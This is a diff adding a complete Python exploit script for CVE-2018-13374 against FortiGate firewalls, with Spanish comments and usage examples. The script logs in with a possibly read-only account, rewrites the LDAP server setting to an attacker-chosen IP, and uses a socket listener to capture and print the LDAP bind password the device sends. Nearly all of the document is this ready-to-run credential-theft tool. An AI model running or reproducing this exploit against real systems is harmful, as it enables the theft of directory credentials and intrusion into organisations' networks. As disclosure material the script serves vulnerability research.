@@ -1,0 +1,144 @@
+#/usr/bin/python3
+
+"""
+CVE-2018-13374
+Publicado por Julio Ureña (PlainText)
+Twitter: @JulioUrena
+Blog Post: https://plaintext.do/My-1st-CVE-Capture-LDAP-Credentials-From-FortiGate-EN/
+Referencia: https://fortiguard.com/psirt/FG-IR-18-157
+
+Ejemplo: python3 CVE-2018-13374.py -f https://FortiGateIP -u usuario -p password -i MiIP 
+Ejemplo con Proxy: python3 CVE-2018-13374.py -f https://FortiGateIP -u usuario -p password -i MiIP  --proxy http://127.0.0.1:8080
+"""
+
+from threading import Thread
+from time import sleep
+import json, requests, socket, sys, re, click
+
+# Disable SSL Warning
+requests.packages.urllib3.disable_warnings()
+
+# To keep the Cookies after login.
+s = requests.Session()
+	
+def AccessFortiGate(fortigate_url, username, password, proxy_addr):
+	url_login = fortigate_url+'/logincheck'
+
+	# Pass username and Password
+	payload = {"ajax": 1, "username":username, "secretkey":password}
+
+	# verify=False - to avoid SSL warnings
+	r = s.post(url_login, data=payload, proxies=proxy_addr, verify=False)
+
+	if s.cookies:
+		return True
+	else:
+		return False
+	
+
+def TriggerVuln(fortigate_url, ip, proxy_addr):
+	print("[+] Triggering Vulnerability")
+	# Access LDAP Server TAB
+	r = s.get(fortigate_url+'/p/user/ldap/json/',cookies=requests.utils.dict_from_cookiejar(s.cookies), proxies=proxy_addr, verify=False)
+
+	# Load the response in a json object 
+	json_data = json.loads(r.text)
+
+	# Assign values based on FortiGate LDAP configuration
+	name = json_data['source'][0]['name']
+	username = json_data['source'][0]['username']
+	port = int(json_data['source'][0]['port'])
+	cnid = json_data['source'][0]['cnid']
+	dn = json_data['source'][0]['dn']
+	ca = json_data['source'][0]['ca-cert']
+	
+	thread = Thread(target = GetCreds, args = (ip, port))
+	thread.start()
+	sleep(1)
+	
+	print("[+] Username: ", username)
+	
+	# Create json object for the vulnerable request, changing the server and setting up secure to 0
+	ldap_request = {"info_only":1,"mkey":name,"ldap":{"server":ip,"port":port,"cn_id":cnid,"username":username,"dn":dn,"secure":0,"ca":ca,"type":2}}
+
+	# Trigger the vulnerability
+	r = s.get(fortigate_url+'/api/ldap?json='+str(ldap_request), cookies=requests.utils.dict_from_cookiejar(s.cookies),proxies=proxy_addr, verify=False)
+	r.close()
+
+def GetCreds(server, port):
+	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	
+	# Allow to reuse the server/port in case of: OSError: [Errno 98] Address already in use
+	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+	server_address = (server, port)
+	sock.bind(server_address)
+
+	sock.listen()
+	credentials = ''
+
+	while True:
+		print('[+] Waiting Fortigate connection ...')
+		c, client_address = sock.accept()		
+		try:
+			while True:
+				data = c.recv(1024)
+				credentials = str(data)
+				# \\x80\\ was common with 3 different passwords / user names, that's why it's been used as reference. 
+				# It separe the username and the password
+				ldap_pass = re.sub(r'.*\\x80\\','',credentials) #.replace("'","")
+				print("[+] Password: ", ldap_pass[3:-1])
+				break
+		finally:
+			c.shutdown(socket.SHUT_RDWR)
+			c.close()
+			sock.shutdown(socket.SHUT_RDWR)
+			sock.close()
+
+		if credentials:
+			break
+
+def print_help(self, param, value):
+	if value is False:
+		return
+	click.echo(self.get_help())
+	self.exit()
+
+@click.command()
+@click.option('-f', '--fortigate-url', 'fortigate_url', help='FortiGate URL.', required=True)
+@click.option('-u', '--username', 'username', help='Username to login into Fortigate. It can be a read only user.', required=True)
+@click.option('-p', '--password', 'password', help='Password to login into FortiGate.', required=True)
+@click.option('-i', '--ip', 'ip', help='Host IP to send the credentails.', required=True)
+@click.option('-pr', '--proxy', 'proxy', default=None, help='Proxy protocol and IP and Port.', required=False)
+@click.option('-h', '--help', 'help', help='Help', is_flag=True, callback=print_help, expose_value=False, is_eager=False)
+@click.pass_context
+
+
+def main(self, fortigate_url, username, password, ip, proxy):
+	if not fortigate_url and not username and not password:
+		print_help(self, None,  value=True)
+		print("[-] For usage reference use --help")
+		exit(0)
+
+	# Configure Proxy For Web Requests
+	proxy_addr = {
+	        'http': proxy,
+	        'https': proxy
+	}
+	message = """[+] CVE-2018-13374
+[+] Publicado por Julio Ureña (PlainText)
+[+] Blog: https://plaintext.do
+[+] Referencia: https://fortiguard.com/psirt/FG-IR-18-157
+"""
+	print(message)
+
+	if AccessFortiGate(str(fortigate_url),username, password, proxy_addr):
+		print("[+] Logged in.")
+		sleep(1)
+		TriggerVuln(str(fortigate_url), ip, proxy_addr)
+	else:
+		print("[-] Unable to login. Please check the credentials and Fortigate URL.")
+		exit(0)
+
+if __name__ == "__main__":
+	main()
